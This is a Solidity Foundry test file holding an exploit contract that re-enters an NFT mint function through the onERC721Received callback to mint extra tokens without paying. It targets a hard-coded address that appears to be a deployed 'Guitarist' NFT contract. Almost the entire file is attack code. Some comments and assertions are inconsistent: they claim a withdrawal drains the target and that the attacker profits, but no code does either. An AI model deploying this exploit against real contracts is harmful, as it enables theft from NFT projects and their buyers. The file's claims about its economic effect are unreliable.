// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4);
}

interface IGuitarist {
    function mint(uint256 quantity) external payable;
    function balanceOf(address owner) external view returns (uint256);
    function public_mint_status() external view returns (bool);
    function MAX_SUPPLY() external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

contract ExploitContract is IERC721Receiver {
    IGuitarist public target;
    uint256 public reentrancyCount = 0;
    uint256 public maxReentrancy = 5; // Limit to avoid out of gas
    bool public attacking = false;

    constructor() {
        target = IGuitarist(0xA249d8F280BA32Ab3E95bDdf4F3DBDE059d62AC3);
    }

    function attack() external payable {
        require(msg.value == 0.05 ether, "Need exactly 0.05 ETH");
        attacking = true;
        reentrancyCount = 0;

        // Start the first mint
        target.mint{value: 0.05 ether}(1);

        attacking = false;
    }

    function onERC721Received(address, address, uint256, bytes calldata) external override returns (bytes4) {
        // Only reenter if we're in attack mode and haven't hit max
        if (attacking && reentrancyCount < maxReentrancy) {
            reentrancyCount++;

            // Check if we can mint more (within supply limits)
            if (target.totalSupply() + 1 <= target.MAX_SUPPLY()) {
                // Reenter mint without sending more ETH
                // The contract still has our initial 0.05 ETH
                target.mint(1);
            }
        }

        return this.onERC721Received.selector;
    }

    // Allow receiving ETH
    receive() external payable {}
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xA249d8F280BA32Ab3E95bDdf4F3DBDE059d62AC3;
    address attacker = address(this);
    ExploitContract public exploit;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll deploy the exploit contract in the test
        // Ensure public_mint_status is true (it is by default)
        // The contract already has ETH from initial mints (constructor mints 250 + 400 + 350 = 1000 NFTs, each costing 0.05 ETH if paid)
        // So contract should have at least 50 ETH (1000 * 0.05) from owner mints

        // Create exploit contract
        exploit = new ExploitContract();

        // Fund exploit contract with enough ETH for initial mint
        deal(address(exploit), 0.05 ether);

        // Label for clarity
        vm.label(address(exploit), "ExploitContract");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        console.log("Initial attacker balance:", initialBalance);

        uint256 initialExploitBalance = address(exploit).balance;
        console.log("Initial exploit contract balance:", initialExploitBalance);

        uint256 initialNFTBalance = IGuitarist(TARGET).balanceOf(address(exploit));
        console.log("Initial NFT balance:", initialNFTBalance);

        // Start the reentrancy attack
        exploit.attack{value: 0.05 ether}();

        // Check results
        uint256 finalNFTBalance = IGuitarist(TARGET).balanceOf(address(exploit));
        console.log("Final NFT balance:", finalNFTBalance);

        // Verify we got more NFTs than we paid for
        // We paid for 1 NFT (0.05 ETH) but should have multiple
        assertGt(finalNFTBalance, 1, "Should have minted more than 1 NFT");

        // Also verify the contract's ETH balance decreased (withdraw was called)
        // This shows the economic impact
        uint256 contractBalance = address(TARGET).balance;
        console.log("Contract balance after attack:", contractBalance);
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

